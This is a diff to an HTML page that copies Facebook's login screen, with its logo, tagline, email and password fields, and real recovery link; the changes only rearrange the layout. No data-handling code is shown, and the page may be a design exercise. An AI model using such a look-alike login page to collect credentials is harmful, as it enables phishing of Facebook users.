@@ -10,28 +10,35 @@
 </head>
 <body>
     <div class="home-page">
-        
-        <div class="home-page__logo">
-            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
-            <h2 class="_8eso">Connect with friends and the world around you on Facebook.</h2>
+        <div class="left-container">
+            <img id="f-logo" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
+            <h2 id="f-quote">Connect with friends and the world
+                <br>
+                around you on Facebook.</h2>
         </div>
 
-        <div class="login-form">
-            <div class="login-form__credentials">
+        <div class="right-container">
+            <div class="login-form">
                 <form id="form">
-                        <input id="username" class="login-form_field" type="text" placeholder="Email or phone number">
-                        <input id="password" class="login-form_field" type="password" placeholder="Password">
+                        <input type="text" placeholder="Email or phone number">
+                        <input type="password" placeholder="Password">
                         <button id="login-btn" type="submit" name="login">Log In</button>
                 </form>
-                <a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjUyNzMyNzYxLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login">Forgot password?</a>
-            </div>
-            <!-- This will almost never be used. Simply for design purposes. -->
-            <div class="login-form__create-account">
-                <a href="https://www.facebook.com">Create new account</a>
-                <a href="https://www.facebook.com">Create a Page</a> for a celebrity, brand or business.
-            </div>
-        </div>
+                
+                <center>
+                    <a id="forgot-pass" href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjUyNzMyNzYxLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login">Forgot password?</a>
+                </center>
+                
+                <div id="line"></div>
 
+                <!-- This will almost never be used. Simply for design purposes. -->
+                <div class="login-form__create-account">
+                    <a href="https://www.facebook.com">Create new account</a>
+                </div>
+            </div>
+            
+            <a id="create-page" href="https://www.facebook.com">Create a Page</a> for a celebrity, brand or business.
+        </div>
     </div>   
 </body>
 </html>
